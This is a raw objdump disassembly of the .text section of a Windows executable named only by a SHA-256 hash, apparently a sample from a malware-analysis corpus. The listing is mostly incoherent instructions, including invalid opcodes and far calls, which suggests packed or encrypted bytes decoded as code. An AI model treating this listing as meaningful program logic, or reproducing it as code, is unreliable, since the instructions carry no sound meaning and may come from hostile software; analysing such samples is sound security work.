
3b0313d2013ac8bdd6fd4ac9e1491db4f8cff2e8b3f7ebbf60111b7861923d95.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	adc    dl,BYTE PTR [eax+0x22848240]
  401006:	sbb    al,0x43
  401008:	add    BYTE PTR [eax],al
  40100a:	add    DWORD PTR [eax],eax
  40100c:	or     cl,ah
  40100e:	add    BYTE PTR [ecx],0x58
  401011:	inc    eax
  401012:	add    BYTE PTR [ecx],al
  401014:	push   0x84298800
  401019:	xor    BYTE PTR [ecx-0x70],al
  40101c:	pop    es
  40101d:	shl    BYTE PTR [edx],0x10
  401020:	inc    eax
  401021:	inc    eax
  401022:	or     BYTE PTR [eax],ch
  401024:	jo     0x40104b
  401026:	add    dh,BYTE PTR [eax]
  401028:	add    al,BYTE PTR [esp+edx*2]
  40102b:	adc    ah,al
  40102d:	adc    DWORD PTR [esi],edx
  40102f:	nop
  401030:	push   es
  401031:	stos   BYTE PTR es:[edi],al
  401032:	xchg   ebx,eax
  401033:	and    BYTE PTR [ebx],dl
  401035:	push   es
  401036:	sbb    eax,0x4a508456
  40103b:	test   BYTE PTR [ecx+0x10],ch
  40103e:	inc    eax
  40103f:	push   eax
  401040:	add    eax,DWORD PTR [ecx+0x280000a0]
  401046:	add    BYTE PTR [eax],ah
  401048:	and    BYTE PTR [ecx+0x32],al
  40104b:	add    esi,DWORD PTR [eax+0x40]
  40104e:	and    al,0x58
  401050:	and    BYTE PTR [eax-0x78],bl
  401053:	arpl   WORD PTR [eax-0x7d],sp
  401056:	pusha  
  401057:	and    al,0x64
  401059:	add    al,0x66
  40105b:	or     ah,BYTE PTR [eax]
  40105d:	add    al,BYTE PTR [ebx]
  40105f:	and    BYTE PTR [eax],0x8a
  401062:	cli    
  401063:	fadd   DWORD PTR [eax]
  401065:	and    al,BYTE PTR [edx+eax*1]
  401068:	and    DWORD PTR [eax],0x12270443
  40106e:	add    eax,DWORD PTR [eax]
  401070:	and    BYTE PTR ds:0x4a287812,al
  401076:	dec    ebx
  401077:	xor    BYTE PTR [eax+0x47],dl
  40107a:	and    al,0x8
  40107c:	je     0x401098
  40107e:	add    BYTE PTR [eax],cl
  401080:	add    BYTE PTR [edx+0x46],dh
  401083:	or     al,0x0
  401085:	mov    al,ds:0x18091150
  40108a:	and    BYTE PTR [eax-0x75c6749f],dl
  401090:	or     BYTE PTR [eax],al
  401092:	ror    ah,0x20
  401095:	sub    ebx,DWORD PTR ds:0xc8c28c10
  40109b:	shl    esp,0xa8
  40109e:	and    eax,0xa033f0ac
  4010a3:	push   es
  4010a4:	xor    al,cl
  4010a6:	arpl   WORD PTR [esi+0x40800208],cx
  4010ac:	add    dh,BYTE PTR [edx+0x4a1006]
  4010b2:	pushf  
  4010b3:	dec    ecx
  4010b4:	add    DWORD PTR [ebx],edx
  4010b6:	pusha  
  4010b7:	lds    ebp,FWORD PTR [esp+eax*1]
  4010ba:	add    DWORD PTR [ebx-0x6f],eax
  4010bd:	xchg   DWORD PTR [ebp-0x6c],esp
  4010c0:	and    BYTE PTR ds:[eax+0x16e101],ch
  4010c7:	mov    WORD PTR [eax],es
  4010c9:	add    BYTE PTR [edi],cl
  4010cb:	add    DWORD PTR [edx+eax*4],eax
  4010ce:	adc    BYTE PTR [edx],al
  4010d0:	xor    BYTE PTR [eax+0x80000a1],0x10
  4010d7:	jb     0x401099
  4010d9:	adc    BYTE PTR [eax],dl
  4010db:	sub    ah,BYTE PTR [edx-0x6fe4ed78]
  4010e1:	or     BYTE PTR [ebp+edx*4+0x8],al
  4010e5:	add    DWORD PTR [edi+0x7008018],eax
  4010eb:	mov    BYTE PTR [edx+0x1],dl
  4010ee:	add    BYTE PTR [edx+ecx*1],ch
  4010f1:	test   eax,0x10041b9c
  4010f6:	and    eax,0x6006a200
  4010fb:	stos   DWORD PTR es:[edi],eax
  4010fc:	nop
  4010fd:	sub    BYTE PTR [eax],al
  4010ff:	ror    BYTE PTR [ebx],0x0
  401102:	mov    BYTE PTR [eax+0x60],cl
  401105:	or     BYTE PTR [eax+0x7280306],bl
  40110b:	xchg   esp,eax
  40110c:	data16 add dl,BYTE PTR [ecx]
  40110f:	cmp    DWORD PTR [ecx+eiz*4],edi
  401112:	daa    
  401113:	mov    eax,ds:0xf419
  401118:	push   cs
  401119:	enter  0x2c0,0xa0
  40111d:	pusha  
  40111e:	xchg   edx,eax
  40111f:	push   eax
  401120:	or     DWORD PTR [eax+0x40],ebx
  401123:	add    BYTE PTR [esi+edx*2],al
  401126:	ret    
  401127:	or     dl,0x1
  40112a:	and    BYTE PTR [eax],0x0
  40112d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40112e:	inc    esp
  40112f:	sub    esp,DWORD PTR [edx+edx*8]
  401132:	and    DWORD PTR [eax-0x7f],esi
  401135:	add    eax,0x2d018004
  40113a:	sbb    esp,DWORD PTR [ecx+0x140027]
  401140:	test   BYTE PTR [eax+0x44300d81],al
  401146:	add    DWORD PTR [eax],ecx
  401148:	pusha  
  401149:	sbb    al,BYTE PTR [ecx+0x296142a0]
  40114f:	adc    BYTE PTR [ecx+0x8a0060],dl
  401155:	xor    BYTE PTR [eax],ah
  401157:	adc    al,BYTE PTR [eax+0x63]
  40115a:	sbb    dh,BYTE PTR [ecx+0x42]
  40115d:	or     BYTE PTR [eax],dl
  40115f:	inc    ebp
  401160:	or     BYTE PTR [edx],0x50
  401163:	dec    ecx
  401164:	mov    ds:0x6c188632,al
  401169:	add    al,BYTE PTR [edx]
  40116b:	push   esp
  40116c:	or     BYTE PTR [edx],al
  40116e:	fs popa 
  401170:	mov    ds:0x3941002,al
  401175:	lock inc eax
  401177:	add    BYTE PTR [ecx-0x5395cdff],al
  40117d:	xor    al,0x2
  40117f:	add    BYTE PTR [eax],dl
  401181:	dec    ebx
  401182:	or     DWORD PTR [edx],eax
  401184:	add    BYTE PTR [edx],ah
  401186:	add    DWORD PTR [eax],edx
  401188:	add    BYTE PTR [ecx],ch
  40118a:	xchg   ecx,eax
  40118b:	sub    BYTE PTR [eax],ah
  40118d:	add    DWORD PTR [esp+esi*4],eax
  401190:	add    BYTE PTR [eax],al
  401192:	or     al,0x1f
  401194:	inc    esp
  401195:	add    al,0x0
  401197:	add    BYTE PTR [ebx],al
  401199:	inc    esp
  40119a:	add    BYTE PTR [edx],bh
  40119c:	xchg   ecx,eax
  40119d:	add    al,0x29
  40119f:	mov    DWORD PTR [eax+0x2],edx
  4011a2:	add    BYTE PTR [eax+0x28216c],cl
  4011a8:	inc    ecx
  4011a9:	bound  ebp,QWORD PTR [eax]
  4011ab:	and    BYTE PTR [eax+0x5116002],cl
  4011b1:	inc    esp
  4011b2:	add    al,0xc
  4011b4:	inc    edx
  4011b5:	or     al,BYTE PTR [eax]
  4011b7:	push   0x8061801
  4011bc:	adc    BYTE PTR [eax-0x78],al
  4011bf:	cpuid  
  4011c1:	clc    
  4011c2:	dec    esp
  4011c3:	add    BYTE PTR [edx-0x7e],0x2
  4011c7:	add    DWORD PTR [eax],edx
  4011c9:	adc    al,BYTE PTR [ebx]
  4011cb:	lock or BYTE PTR [eax+esi*1+0x2b028e1],al
  4011d3:	or     al,0x6
  4011d5:	dec    ecx
  4011d6:	add    eax,esp
  4011d8:	dec    eax
  4011d9:	or     DWORD PTR [ebx],0x565800e4
  4011df:	add    BYTE PTR [ebx+0x4288600],al
  4011e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011e7:	adc    dl,al
  4011e9:	sub    BYTE PTR [eax+eax*2],al
  4011ec:	add    BYTE PTR [eax+0x6],ch
  4011ef:	sbb    edx,DWORD PTR [edx]
  4011f1:	or     DWORD PTR [eax+0x0],ecx
  4011f4:	or     al,BYTE PTR [eax]
  4011f6:	add    BYTE PTR [esi+0x10],0xe0
  4011fa:	rol    BYTE PTR [eax],1
  4011fc:	adc    DWORD PTR [esp+edx*1],esp
  4011ff:	imul   esp,DWORD PTR ds:0x406085a0,0x2021c2
  401209:	nop
  40120a:	add    al,0xb8
  40120c:	add    BYTE PTR [ebp+0x12],dh
  40120f:	adc    DWORD PTR [eax+0x40],eax
  401212:	add    BYTE PTR [ecx],al
  401214:	adc    al,0x4
  401216:	add    DWORD PTR [ebx+edx*1],eax
  401219:	mov    WORD PTR [eax],ss
  40121b:	rcl    DWORD PTR [eax+0x1a],0x60
  40121f:	rol    BYTE PTR [ecx],0x5
  401222:	xchg   edx,eax
  401223:	add    eax,0x42905286
  401228:	xor    al,BYTE PTR [eax]
  40122a:	and    eax,DWORD PTR [ebp-0x54]
  40122d:	fcomp  QWORD PTR [edx]
  40122f:	mov    BYTE PTR [eax],al
  401231:	inc    eax
  401232:	or     cl,bl
  401234:	or     BYTE PTR [ebx],al
  401236:	or     BYTE PTR [eax],0x44
  401239:	add    al,0x82
  40123b:	(bad)  
  40123c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40123d:	push   eax
  40123e:	adc    BYTE PTR [eax],al
  401240:	sbb    DWORD PTR [eax],eax
  401242:	mov    cs,WORD PTR [ecx+0x10]
  401245:	inc    ecx
  401246:	inc    esp
  401247:	sbb    DWORD PTR [edx],ecx
  401249:	adc    BYTE PTR [eax],dh
  40124b:	adc    al,BYTE PTR [eax-0x5a]
  40124e:	or     BYTE PTR [edi],al
  401250:	inc    esp
  401251:	mov    al,BYTE PTR [eax]
  401253:	shl    DWORD PTR [edx+0x45],0xc
  401257:	or     eax,DWORD PTR [eax+0xd]
  40125a:	add    al,0x2
  40125c:	xor    al,BYTE PTR [edx]
  40125e:	mov    cl,0x10
  401260:	add    BYTE PTR [edx-0x60],cl
  401263:	add    DWORD PTR [edx+0x30404088],esp
  401269:	inc    eax
  40126a:	add    al,0x40
  40126c:	or     BYTE PTR [edx-0x30],al
  40126f:	mov    DWORD PTR [eax],esp
  401271:	mov    ds:0x881001d9,al
  401276:	mov    es,WORD PTR [ecx]
  401278:	add    DWORD PTR [edx+0x60002001],ebp
  40127e:	add    BYTE PTR [ecx],cl
  401280:	mov    ds:0x92c45080,eax
  401285:	add    DWORD PTR [edx],edx
  401287:	and    ah,BYTE PTR [eax-0x4c]
  40128a:	add    BYTE PTR [esi+eax*1],dl
  40128d:	inc    ebp
  40128e:	nop
  40128f:	dec    esp
  401290:	add    DWORD PTR [esp+edi*1],ebx
  401293:	add    al,ah
  401295:	add    BYTE PTR [eax],0x2
  401298:	arpl   WORD PTR [ebx],dx
  40129a:	test   ah,ch
  40129c:	push   es
  40129d:	dec    edx
  40129e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40129f:	inc    edx
  4012a0:	inc    eax
  4012a1:	and    BYTE PTR [eax+0x2402819],bh
  4012a7:	add    DWORD PTR [eax],edx
  4012a9:	add    ecx,DWORD PTR [ecx]
  4012ab:	adc    esp,DWORD PTR [ebx+eax*1]
  4012ae:	xor    DWORD PTR [edx+0x481d65c4],ecx
  4012b4:	or     al,0x42
  4012b6:	loope  0x4012b8
  4012b8:	pushf  
  4012b9:	add    BYTE PTR [edx+0x6c81e08a],0xa
  4012c0:	or     al,al
  4012c2:	xchg   ecx,eax
  4012c3:	xor    BYTE PTR [eax],cl
  4012c5:	add    BYTE PTR [eax],ah
  4012c7:	xor    al,0xc0
  4012c9:	sbb    eax,esi
  4012cb:	add    al,BYTE PTR [ecx+0x4]
  4012ce:	sub    BYTE PTR [ecx],cl
  4012d0:	gs xchg ecx,eax
  4012d2:	add    BYTE PTR [ebx],ch
  4012d4:	and    eax,0x84100101
  4012d9:	inc    eax
  4012da:	mov    al,ds:0x80861122
  4012df:	enter  0x5040,0x21
  4012e3:	add    eax,0x990104a
  4012e8:	xor    cl,BYTE PTR [eax+esi*4]
  4012eb:	pusha  
  4012ec:	ror    DWORD PTR [edx+0x2bcc],0x80
  4012f3:	mov    cl,0x44
  4012f5:	bound  eax,QWORD PTR [eax]
  4012f7:	inc    eax
  4012f8:	mov    al,ds:0x30003b21
  4012fd:	add    DWORD PTR [ebx-0x7ffc7fdc],eax
  401303:	xor    al,0x12
  401305:	push   edx
  401306:	and    ecx,edx
  401308:	adc    DWORD PTR [edi],edx
  40130a:	inc    esi
  40130b:	adc    BYTE PTR [eax+eax*4],cl
  40130e:	add    DWORD PTR [eax+eiz*1],ecx
  401311:	or     BYTE PTR [eax+0x42182202],dl
  401317:	pop    ebx
  401318:	add    DWORD PTR ds:0x78563028,0x10000
  401322:	add    DWORD PTR [eax+0x6],esp
  401325:	add    al,BYTE PTR [esp+ebp*1]
  401328:	and    esp,DWORD PTR [eax-0x80]
  40132b:	adc    dl,BYTE PTR [esi]
  40132d:	add    BYTE PTR [eax+0x47c00016],al
  401333:	add    BYTE PTR [ebx],al
  401335:	add    BYTE PTR [eax],al
  401337:	and    BYTE PTR [eax+ecx*1+0x310282],dl
  40133e:	and    BYTE PTR [ebx+ebp*1],al
  401341:	sub    BYTE PTR [edx+eax*4-0x7f],al
  401345:	mov    dl,0x18
  401347:	add    BYTE PTR [eax+0x20220446],0x4
  40134e:	xor    BYTE PTR [eax+0x14641c],0x0
  401355:	add    eax,DWORD PTR ds:0x4005b016
  40135b:	add    BYTE PTR [edx+0x40080630],al
  401361:	inc    eax
  401362:	or     BYTE PTR [ecx],al
  401364:	or     al,al
  401366:	stos   DWORD PTR es:[edi],eax
  401367:	and    BYTE PTR [edx],al
  401369:	or     BYTE PTR [edx],cl
  40136b:	adc    BYTE PTR [ebx+0x10000104],al
  401371:	mov    ds:0x71a08108,al
  401376:	add    eax,0x44100118
  40137b:	adc    BYTE PTR [edx],0x1
  40137e:	pop    eax
  40137f:	and    BYTE PTR [eax],dl
  401381:	sbb    BYTE PTR [eax],al
  401383:	add    DWORD PTR [ecx],ecx
  401385:	inc    eax
  401386:	add    BYTE PTR [eax+edx*2+0x4],al
  40138a:	xor    al,0x4a
  40138c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40138d:	add    DWORD PTR [eax+eax*4+0x42088c90],edx
  401394:	sub    DWORD PTR [eax+eax*1+0x2],0x38423990
  40139c:	add    dh,BYTE PTR [eax]
  40139e:	rcl    BYTE PTR [eax],1
  4013a0:	adc    DWORD PTR [edx],ecx
  4013a2:	or     BYTE PTR [eax],ch
  4013a4:	or     BYTE PTR [ebx+0x40881842],0x20
  4013ab:	adc    esi,DWORD PTR [eax]
  4013ad:	pop    ebp
  4013ae:	and    BYTE PTR [eax],ch
  4013b0:	and    ah,BYTE PTR [ebp-0x3f]
  4013b3:	inc    esp
  4013b4:	inc    eax
  4013b5:	nop
  4013b6:	add    al,BYTE PTR [eax+eax*4+0x14]
  4013ba:	mov    WORD PTR [eax],es
  4013bc:	adc    ecx,DWORD PTR ds:0x87201460
  4013c2:	or     DWORD PTR [ebx],esp
  4013c4:	add    al,0x18
  4013c6:	and    BYTE PTR [eax-0x7bfd7bf9],al
  4013cc:	inc    ecx
  4013cd:	loop   0x4013dc
  4013cf:	sub    ebx,DWORD PTR [eax]
  4013d1:	and    DWORD PTR [ebp+0x3c],ebx
  4013d4:	add    BYTE PTR [eax+0x50],0x8
  4013d8:	xchg   esp,eax
  4013d9:	sbb    BYTE PTR [edx+0x4b186120],0x2
  4013e0:	test   BYTE PTR [edx],al
  4013e2:	add    BYTE PTR [ecx],0x21
  4013e5:	mov    BYTE PTR [ebx+0x44],dl
  4013e8:	jo     0x40140e
  4013ea:	nop
  4013eb:	add    BYTE PTR [edx],cl
  4013ed:	jl     0x4013f8
  4013ef:	add    BYTE PTR [ecx+0x1902cc],al
  4013f5:	xor    DWORD PTR [eax+eax*2],0xd
  4013f9:	xor    BYTE PTR [edx+0x30109949],0x0
  401400:	add    BYTE PTR [edx+0x2],al
  401403:	js     0x401406
  401405:	add    DWORD PTR [ebp-0x4e],ebx
  401408:	push   ss
  401409:	inc    esp
  40140a:	add    BYTE PTR [eax+0x1d88813],al
  401410:	and    BYTE PTR [esp+edx*1],0x4c
  401414:	add    BYTE PTR [eax+0x40040090],al
  40141a:	inc    eax
  40141b:	add    al,al
  40141d:	and    BYTE PTR [ebx],al
  40141f:	mov    BYTE PTR [eax],al
  401421:	inc    eax
  401422:	and    DWORD PTR [ebx+0x41],eax
  401425:	add    BYTE PTR [esp+ecx*2-0x80],ah
  401429:	add    DWORD PTR [ebx],0x1882020
  40142f:	ror    BYTE PTR [ecx],cl
  401431:	mov    al,ds:0x53801651
  401436:	add    BYTE PTR [esp+eax*1],dl
  401439:	add    al,0x8
  40143b:	or     BYTE PTR [ecx+0x0],dl
  40143e:	add    BYTE PTR [eax],al
  401440:	inc    ebx
  401441:	mov    ch,0x85
  401443:	xor    BYTE PTR [ecx+0x0],bl
  401446:	add    DWORD PTR [ecx+eax*4+0x8002000],eax
  40144d:	mov    esp,0x80120690
  401452:	adc    al,0x7
  401454:	dec    ecx
  401455:	add    al,0x10
  401457:	adc    BYTE PTR [ebx+ebx*4-0x3dfeff30],0x2c
  40145f:	cmp    ah,BYTE PTR [eax-0x7]
  401462:	or     BYTE PTR [eax],dl
  401464:	and    BYTE PTR [eax+0x3],ah
  401467:	inc    edx
  401468:	lea    ecx,[edx+0x3082084]
  40146e:	ror    BYTE PTR [edi],0x0
  401471:	shl    BYTE PTR [ebx],1
  401473:	or     BYTE PTR [ecx+0x10],0x0
  401477:	xor    BYTE PTR [ecx+eax*1],al
  40147a:	add    eax,DWORD PTR [edx-0x5e]
  40147d:	mov    al,ds:0xe300a800
  401482:	mov    al,ds:0x82700402
  401487:	rcr    DWORD PTR [esp+eax*4+0x2a128914],0x9c
  40148f:	inc    edi
  401490:	add    BYTE PTR [ecx],dl
  401492:	push   ecx
  401493:	mov    al,ds:0x100e54a9
  401498:	and    eax,0x1c818b
  40149d:	xor    BYTE PTR [eax],al
  40149f:	inc    eax
  4014a0:	adc    BYTE PTR [esi+eax*1],al
  4014a3:	cmp    BYTE PTR [eax],dh
  4014a5:	add    BYTE PTR [eax-0x4f],cl
  4014a8:	inc    eax
  4014a9:	adc    BYTE PTR [eax],ah
  4014ab:	and    BYTE PTR [eax+edx*1-0x3b],bl
  4014af:	sbb    BYTE PTR [eax],bh
  4014b1:	add    BYTE PTR [eax],dh
  4014b3:	inc    eax
  4014b4:	and    edx,DWORD PTR [edx]
  4014b6:	add    BYTE PTR [eax+0x15],cl
  4014b9:	sbb    al,0x26
  4014bb:	add    al,0x4c
  4014bd:	add    eax,0x600e9020
  4014c2:	mov    al,ds:0x2406d1
  4014c7:	popa   
  4014c8:	add    BYTE PTR [ecx],dh
  4014ca:	daa    
  4014cb:	adc    DWORD PTR [eax+0x6],edx
  4014ce:	xor    BYTE PTR [ebx],bh
  4014d0:	add    eax,DWORD PTR [eax]
  4014d2:	adc    eax,0x91a02017
  4014d7:	call   0x9270:0x8306009
  4014de:	add    DWORD PTR [ecx],eax
  4014e0:	add    DWORD PTR [eax],eax
  4014e2:	add    DWORD PTR [ebx+eax*2-0x5fe5db60],ecx
  4014e9:	xor    BYTE PTR [ecx+0x2c34e09],dl
  4014ef:	add    DWORD PTR [eax+0x7f],ebx
  4014f2:	dec    esp
  4014f3:	push   es
  4014f4:	adc    BYTE PTR [eax],al
  4014f6:	and    BYTE PTR [edi+0x57024a],dh
  4014fc:	add    BYTE PTR [eax],al
  4014fe:	add    cl,ah
  401500:	sub    BYTE PTR [ebx],0x82
  401503:	push   es
  401504:	add    cl,BYTE PTR [ecx]
  401506:	add    DWORD PTR [esi],esp
  401508:	add    BYTE PTR [ecx],al
  40150a:	add    BYTE PTR [ecx],0xc8
  40150d:	add    BYTE PTR [ebx],al
  40150f:	cwde   
  401510:	sbb    al,BYTE PTR [eax]
  401512:	push   cs
  401513:	and    BYTE PTR [eax+eax*4-0x5f],al
  401517:	test   BYTE PTR [esp+ecx*1],dh
  40151a:	inc    eax
  40151b:	adc    DWORD PTR ds:0x100ca264,0x402050ea
  401525:	mov    al,0x8
  401527:	xchg   edx,eax
  401528:	sbb    al,0x3
  40152b:	add    al,0x8
  40152d:	push   ecx
  40152e:	add    BYTE PTR [ecx],0x80
  401531:	dec    ebx
  401532:	rcr    BYTE PTR [ecx],1
  401534:	add    DWORD PTR ds:0x23004,esi
  40153a:	mov    al,ds:0x8208000
  40153f:	xor    cl,BYTE PTR ds:0x422ec4e8
  401545:	xchg   BYTE PTR [eax-0x497d72de],al
  40154b:	and    eax,0x46080003
  401550:	mov    edx,0x80588404
  401555:	add    BYTE PTR [eax+0x21100c40],cl
  40155b:	xor    BYTE PTR [eax],dl
  40155d:	or     BYTE PTR [esi+0x4],al
  401560:	adc    DWORD PTR [ecx+0x824802],eax
  401566:	push   ebx
  401567:	and    BYTE PTR [eax+0x2350c418],al
  40156d:	xchg   ebp,eax
  40156e:	sub    DWORD PTR [eax+0x4851041],ecx
  401574:	add    BYTE PTR [eax+0x304290b0],al
  40157a:	adc    BYTE PTR [esi+0x0],0xc2
  40157e:	pop    ss
  40157f:	add    DWORD PTR ds:0x144002c0,ebx
  401585:	adc    BYTE PTR [eax-0x51fcfdb8],cl
  40158b:	or     edx,DWORD PTR [edx+0x49]
  40158e:	mov    BYTE PTR [esp+ecx*2],ch
  401591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401592:	inc    eax
  401593:	pusha  
  401594:	push   edx
  401595:	xor    BYTE PTR [eax],al
  401597:	mov    al,0x60
  401599:	sbb    BYTE PTR [eax],al
  40159b:	inc    ebx
  40159c:	add    BYTE PTR [edx],0x10
  40159f:	ret    0x7376
  4015a2:	loopne 0x40159c
  4015a4:	xchg   esp,eax
  4015a5:	add    DWORD PTR [eax+0x10],eax
  4015a8:	xchg   ecx,eax
  4015a9:	dec    ecx
  4015aa:	rol    BYTE PTR [ebx+0x4],0xb
  4015ae:	jo     0x401550
  4015b0:	sub    DWORD PTR [esi+0xa07d019],ecx
  4015b6:	adc    BYTE PTR [eax],0x2a
  4015b9:	dec    eax
  4015ba:	and    BYTE PTR [edx],dl
  4015bc:	push   edx
  4015bd:	inc    ebp
  4015be:	adc    BYTE PTR [eax],ah
  4015c0:	xor    BYTE PTR [esp+esi*4],al
  4015c3:	cwde   
  4015c4:	add    DWORD PTR [eax],ecx
  4015c6:	add    BYTE PTR [esp+esi*1],cl
  4015c9:	add    DWORD PTR [ecx],eax
  4015cb:	and    al,0x0
  4015cd:	sub    al,al
  4015cf:	dec    edx
  4015d0:	adc    BYTE PTR [eax+eiz*4],al
  4015d3:	and    BYTE PTR [eax+ecx*2+0x62082a9],cl
  4015da:	or     al,bl
  4015dc:	fwait
  4015dd:	enter  0x1a21,0x0
  4015e1:	add    BYTE PTR [eax],al
  4015e3:	add    BYTE PTR [ecx+0x40001582],al
  4015e9:	add    BYTE PTR [esp+eax*1+0xe804015],dl
  4015f0:	adc    eax,0x221082
  4015f5:	add    BYTE PTR [esi+0x8],bl
  4015f8:	sbb    BYTE PTR [edx],al
  4015fa:	xor    BYTE PTR [ecx+0x18],ch
  4015fd:	and    BYTE PTR [eax],0x32
  401600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401601:	test   al,0x0
  401603:	rcl    BYTE PTR ds:0x8900700,0x60
  40160a:	push   ebp
  40160b:	add    ecx,eax
  40160d:	add    al,0x0
  40160f:	mov    ds:0xa3414130,eax
  401614:	and    DWORD PTR [eax+0x0],edx
  401617:	or     BYTE PTR [edi],al
  401619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40161a:	popa   
  40161b:	add    al,0x1c
  40161d:	add    BYTE PTR [esi],ah
  40161f:	cmc    
  401620:	add    BYTE PTR [ecx+0x1c],al
  401623:	add    al,0xc8
  401625:	or     BYTE PTR [ebx],0xc6
  401628:	or     al,0x18
  40162a:	push   eax
  40162b:	adc    BYTE PTR [edx-0x40],dh
  40162e:	jb     0x401660
  401630:	dec    eax
  401631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401632:	and    al,BYTE PTR [edx+0x20284806]
  401638:	sub    al,0xd
  40163a:	and    eax,0xe8829909
  40163f:	add    BYTE PTR [ebx+eax*1+0x0],al
  401643:	add    al,BYTE PTR [eax]
  401645:	or     cl,BYTE PTR [esi]
  401647:	add    al,BYTE PTR [ecx+0x1a]
  40164a:	mov    BYTE PTR [eax],al
  40164c:	or     DWORD PTR [eax+eax*1],ecx
  40164f:	inc    eax
  401650:	mov    al,ds:0xe00852
  401655:	shr    BYTE PTR [eax],0x40
  401658:	add    al,0x22
  40165a:	inc    esp
  40165b:	mov    al,ds:0x8941307
  401660:	inc    esp
  401661:	xor    al,BYTE PTR [eax]
  401663:	sbb    BYTE PTR [eax],0x26
  401666:	ret    
  401667:	and    BYTE PTR [ecx+0x22],al
  40166a:	add    BYTE PTR [eax+eax*1],al
  40166d:	add    ah,BYTE PTR [edx]
  40166f:	add    ch,BYTE PTR [eax-0x56]
  401672:	and    BYTE PTR [ebx],cl
  401674:	mov    WORD PTR [eax],es
  401676:	xor    al,0x40
  401678:	inc    edx
  401679:	add    al,0x68
  40167b:	inc    eax
  40167c:	add    eax,0x44025008
  401681:	sub    al,0x80
  401683:	adc    eax,0xbd020012
  401688:	or     BYTE PTR [eax+eiz*4+0x9021040],0x14
  401690:	mov    ah,BYTE PTR [esi+0x5b]
  401693:	popa   
  401694:	inc    eax
  401695:	adc    al,BYTE PTR [eax+0x20511892]
  40169b:	add    al,0x2
  40169d:	or     al,0xa4
  40169f:	adc    eax,0x20a002
  4016a4:	add    DWORD PTR [edx],edx
  4016a6:	mov    cl,bl
  4016a8:	sub    DWORD PTR [eax],eax
  4016aa:	(bad)  
  4016ab:	test   al,0x90
  4016ad:	enter  0x80,0x90
  4016b1:	mov    BYTE PTR [ecx],ah
  4016b3:	add    al,0x0
  4016b5:	adc    al,BYTE PTR [ecx]
  4016b7:	and    BYTE PTR [edx+eax*1+0x410e0068],al
  4016be:	xor    al,0x47
  4016c0:	popa   
  4016c1:	push   ecx
  4016c2:	push   ecx
  4016c3:	add    esp,edx
  4016c5:	sbb    bl,ah
  4016c7:	inc    edi
  4016c8:	add    BYTE PTR [edx-0x2c7ef577],dl
  4016ce:	or     BYTE PTR [edi],al
  4016d0:	add    BYTE PTR [eax],ah
  4016d2:	push   ecx
  4016d3:	xor    al,0x21
  4016d5:	sbb    BYTE PTR [eax-0x3f5fffe4],dl
  4016db:	add    eax,0x80400040
  4016e0:	add    DWORD PTR [eax+0x12],edx
  4016e3:	and    dh,BYTE PTR [eax+edx*4+0x6308002]
  4016ea:	loopne 0x4016ec
  4016ec:	and    BYTE PTR [eax],al
  4016ee:	dec    eax
  4016ef:	push   ecx
  4016f0:	push   ss
  4016f1:	nop
  4016f2:	inc    ecx
  4016f3:	add    BYTE PTR [edx+0x57],cl
  4016f6:	add    DWORD PTR [eax],eax
  4016f8:	pop    ebx
  4016f9:	and    DWORD PTR [ebx*1-0x3bbeffbc],0xb
  401701:	or     BYTE PTR [eax+0x41],al
  401704:	inc    esi
  401705:	dec    esp
  401706:	or     eax,eax
  401708:	ror    BYTE PTR [eax-0x76ffe708],0x11
  40170f:	add    BYTE PTR [ebp+ecx*1+0x18],ah
  401713:	inc    esi
  401714:	adc    BYTE PTR [edx-0x7cff7c00],ch
  40171a:	cmp    BYTE PTR [eax],ah
  40171c:	test   eax,0x88300417
  401721:	add    BYTE PTR [eax-0x4a2ddf68],dl
  401727:	inc    edx
  401728:	test   DWORD PTR [ecx+0x222c07],ecx
  40172e:	inc    esp
  40172f:	ret    0x1082
  401732:	dec    edx
  401733:	add    eax,0x14008010
  401738:	and    BYTE PTR [eax],al
  40173a:	xor    ah,BYTE PTR [esp+eax*1]
  40173d:	adc    al,BYTE PTR [esp]
  401740:	push   ss
  401741:	cmp    eax,0x95838000
  401746:	push   ecx
  401747:	push   ebp
  401748:	mov    bl,0x92
  40174a:	xor    esi,DWORD PTR [edx]
  40174c:	add    BYTE PTR [eax],ah
  40174e:	fs push es
  401750:	xor    BYTE PTR [eax+0x1a00],al
  401756:	aad    0x9
  401758:	add    al,BYTE PTR [ecx]
  40175a:	add    BYTE PTR [eax],dl
  40175c:	bound  eax,QWORD PTR [eax]
  40175e:	adc    DWORD PTR [ebp+0x1a],edx
  401761:	shl    DWORD PTR [eax+0x0],0x80
  401765:	add    al,BYTE PTR [ecx+ebx*2]
  401768:	nop
  401769:	daa    
  40176a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40176b:	sub    BYTE PTR [eax],al
  40176d:	mov    al,ds:0x80024800
  401772:	and    al,0x0
  401774:	add    DWORD PTR [esi+0x33],ecx
  401777:	mov    DWORD PTR [esi],eax
  401779:	add    DWORD PTR [eax+0x4],edx
  40177c:	leave  
  40177d:	sub    al,BYTE PTR [ecx]
  40177f:	add    al,BYTE PTR [edx]
  401781:	xchg   DWORD PTR es:[esi+ecx*1+0x3011190],esp
  401789:	nop
  40178a:	adc    BYTE PTR [esp+eax*1],dh
  40178d:	adc    BYTE PTR [eax],al
  40178f:	push   es
  401790:	pusha  
  401791:	xchg   esp,eax
  401792:	pushf  
  401793:	or     BYTE PTR [ecx],al
  401795:	jae    0x4017dc
  401797:	or     BYTE PTR [ecx+eax*1+0x26],ah
  40179b:	add    BYTE PTR [esi+0x8000140],al
  4017a1:	jb     0x40178a
  4017a3:	add    al,0x81
  4017a5:	pop    ss
  4017a6:	add    al,0x50
  4017a8:	add    ecx,DWORD PTR [edx+edx*1]
  4017ab:	add    BYTE PTR [eax+0x60],cl
  4017ae:	les    ebx,FWORD PTR ds:0x4954112c
  4017b4:	and    BYTE PTR [eax],bh
  4017b6:	add    BYTE PTR [edx],0x2
  4017b9:	add    BYTE PTR [eax-0x1c],cl
  4017bc:	sbb    BYTE PTR [ecx],al
